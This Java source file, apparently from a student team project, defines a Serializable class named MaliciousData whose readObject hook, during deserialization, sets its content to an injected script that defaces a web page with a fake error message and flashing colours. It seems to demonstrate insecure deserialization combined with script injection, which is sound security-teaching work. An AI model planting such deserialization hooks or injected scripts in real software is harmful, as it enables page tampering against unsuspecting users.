package com.se518.teamproject;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.io.Serializable;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;

import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.io.ObjectInputStream;
import java.io.IOException;

public class MaliciousData implements Serializable {
    private static final long serialVersionUID = 1L;

    private String content;

    public MaliciousData() {
        this.content = "Default Malicious Content";
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // this.content = "Unexpected Content from Malicious File!";
        this.content = "<script>"
    + "document.body.style.backgroundColor = 'red';"
    + "document.body.style.color = 'white';"
    + "var errorMsg = document.createElement('div');"
    + "errorMsg.innerHTML = '<h1 style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 50px; color: white; font-family: Arial, sans-serif; text-align: center;\">ERROR! Something went wrong!</h1>'; "
    + "document.body.appendChild(errorMsg);"
    + "var body = document.body;"
    + "var colors = ['red', 'black', 'green', 'purple', 'orange'];"
    + "var i = 0;"
    + "setInterval(function() {"
    + "    body.style.backgroundColor = colors[i];"
    + "    i = (i + 1) % colors.length;"
    + "}, 500);"
    + "</script>";

    }

    public String getContent() {
        return content;
    }

    @Override
    public String toString() {
        return "Content: " + content;
    }
}

